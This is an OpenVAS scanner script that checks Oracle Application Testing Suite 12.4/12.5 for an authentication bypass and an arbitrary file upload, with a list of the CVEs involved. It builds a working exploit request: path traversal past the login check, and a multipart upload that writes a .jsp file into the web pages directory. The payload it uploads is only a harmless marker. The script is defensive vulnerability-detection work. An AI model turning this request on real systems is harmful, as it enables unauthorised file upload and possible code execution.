###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_owat_suite_multiple_vuln.nasl 12449 2018-11-21 07:50:18Z cfischer $
#
# Oracle Application Testing Suite Multiple Vulnerabilities
#
# Authors:
# Shakeel <bshakeel@secpod.com>
#
# Copyright:
# Copyright (C) 2016 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

CPE = "cpe:/a:oracle:application_testing_suite";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.809731");
  script_version("$Revision: 12449 $");
  script_cve_id("CVE-2016-0491", "CVE-2016-0492", "CVE-2016-0489", "CVE-2016-0488",
                "CVE-2016-0487", "CVE-2016-0490", "CVE-2016-0476", "CVE-2016-0477",
                "CVE-2016-0478", "CVE-2016-0480", "CVE-2016-0481", "CVE-2016-0482",
                "CVE-2016-0484", "CVE-2016-0485", "CVE-2016-0486");
  script_bugtraq_id(81070, 81124, 81153, 81107, 81097, 81104, 81158, 81102, 81100,
                    81184, 81169, 81199, 81105, 81173, 81163);
  script_tag(name:"cvss_base", value:"6.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:S/C:P/I:P/A:P");
  script_tag(name:"last_modification", value:"$Date: 2018-11-21 08:50:18 +0100 (Wed, 21 Nov 2018) $");
  script_tag(name:"creation_date", value:"2016-11-25 12:07:57 +0530 (Fri, 25 Nov 2016)");
  script_name("Oracle Application Testing Suite Multiple Vulnerabilities");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2016 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("gb_oracle_web_app_test_suite_detect.nasl");
  script_mandatory_keys("Oracle/Application/Testing/Suite/installed");
  script_require_ports("Services/www", 8088);

  script_xref(name:"URL", value:"https://www.exploit-db.com/exploits/39691");
  script_xref(name:"URL", value:"http://www.oracle.com/technetwork/topics/security/cpujan2016-2367955.html");

  script_tag(name:"summary", value:"This host is installed with Oracle Application
  Testing Suite and is prone to multiple vulnerabilities.");

  script_tag(name:"vuldetect", value:"Send a crafted data via HTTP POST request
  and check whether it is able to bypass authentication and upload an arbitrary
  file or not");

  script_tag(name:"insight", value:"Multiple flaws are due to,

  - An error in the UploadFileAction servlet when fileType parameter is set as
    '*'.

  - Errors within the 'isAllowedUrl' function which has a list of URI entries
    which do not require authentication.

  - An error within the ActionServlet servlet which bypasses authentication if
    the URI starts with a specific string.

  - Another error within ActionServlet servlet.

  - An error within the UploadServlet servletin the filename header.

  - An error within the DownloadServlet in the reportName parameter.

  - An error exists within the DownloadServlet n the repository, workspace,
    or scenario parameters.

  - An error within the DownloadServlet in the scriptName parameter if downloadType
    is specified as oseScript.

  - An error within the DownloadServlet servlet in TMAPReportImage where the
    downloadType is specified as TMAPReportImage.

  - An error within the DownloadServlet servlet in the scheduleReportName parameter
    where the downloadType is specified as scheduleTaskResults.

  - An error within the DownloadServlet servlet in file parameter where the
    downloadType is specified as subReport.

  - An error within the DownloadServlet servlet in the scriptPath parameter where
    the downloadType is specified as otmPkg.

  - An error within the DownloadServlet servlet in the reportName parameter where
    the downloadType is specified as OTMReport.

  - An error within the DownloadServlet servlet in exportFileName parameter where
    the downloadType is specified as OTMExportFile.");

  script_tag(name:"impact", value:"Successful exploitation will allow remote attackers
  to bypass authentication, gain access to potentially sensitive files and execute
  arbitrary code on the affected system.");

  script_tag(name:"affected", value:"Oracle Application Testing Suite versions
  12.4.0.2 and 12.5.0.2");

  script_tag(name:"solution", value:"Apply the update from the referenced advisory.");

  script_tag(name:"qod_type", value:"exploit");
  script_tag(name:"solution_type", value:"VendorFix");

  exit(0);
}

include("host_details.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("misc_func.inc");

if(!oatPort = get_app_port(cpe:CPE)){
  exit(0);
}

vtstrings = get_vt_strings();

uploadfile = vtstrings["default_rand"] + "-TEST.jsp";

postData = string('-----------------------------', vtstrings["default"], '\r\n',
                  'Content-Disposition: form-data; name="storage.extension"\r\n\r\n',
                  '.jsp\r\n',
                  '-----------------------------', vtstrings["default"], '\r\n',
                  'Content-Disposition: form-data; name="fileName1"\r\n\r\n',
                  uploadfile, '\r\n',
                  '-----------------------------', vtstrings["default"], '\r\n',
                  'Content-Disposition: form-data; name="fileName2"\r\n\r\n\r\n',
                  '-----------------------------', vtstrings["default"], '\r\n',
                  'Content-Disposition: form-data; name="fileName3"\r\n\r\n\r\n',
                  '-----------------------------', vtstrings["default"], '\r\n',
                  'Content-Disposition: form-data; name="fileName4"\r\n\r\n\r\n',
                  '-----------------------------', vtstrings["default"], '\r\n',
                  'Content-Disposition: form-data; name="fileType"\r\n\r\n',
                  '*\r\n',
                  '-----------------------------', vtstrings["default"], '\r\n',
                  'Content-Disposition: form-data; name="file1"; filename="', uploadfile, '"\r\n',
                  'Content-Type: text/plain\r\n\r\n',
                  vtstrings["default"], '-File-Upload-Test-https://www.exploit-db.com/exploits/39691/', '\r\n',
                  '-----------------------------', vtstrings["default"], '\r\n',
                  'Content-Disposition: form-data; name="storage.repository"\r\n\r\n',
                  'Default\r\n',
                  '-----------------------------', vtstrings["default"], '\r\n',
                  'Content-Disposition: form-data; name="storage.workspace"\r\n\r\n', '.', '\r\n',
                  '-----------------------------', vtstrings["default"], '\r\n',
                  'Content-Disposition: form-data; name="directory"\r\n\r\n',
                  '../oats\\servers\\AdminServer\\tmp\\_WL_user\\oats_ee\\1ryhnd\\war\\pages\r\n',
                  '-----------------------------', vtstrings["default"], '--\r\n');

vuln_url = "/olt/Login.do/../../olt/UploadFileUpload.do";

req = http_post_req( port:oatPort, url:vuln_url,
                     data:postData, add_headers: make_array( "Content-Type",
                     string("multipart/form-data; boundary=---------------------------", vtstrings["default"])));
res = http_keepalive_send_recv(port: oatPort, data: req);

if(res =~ "^HTTP/1\.[01] 200" && "Upload failed" >!< res){

  url = "/olt/pages/" + uploadfile;
  req = http_get(item: url, port:oatPort);
  res = http_keepalive_send_recv(port: oatPort, data: req);

  if(res && vtstrings["default"] + "-File-Upload-Test" >< res){
    report = report_vuln_url( port:oatPort, url:vuln_url);
    report = report + '\n' + "The scanner has uploaded a file: " + uploadfile + ". Please remove it manually.";
    security_message(port:oatPort, data:report);
    exit(0);
  }
}

exit(99);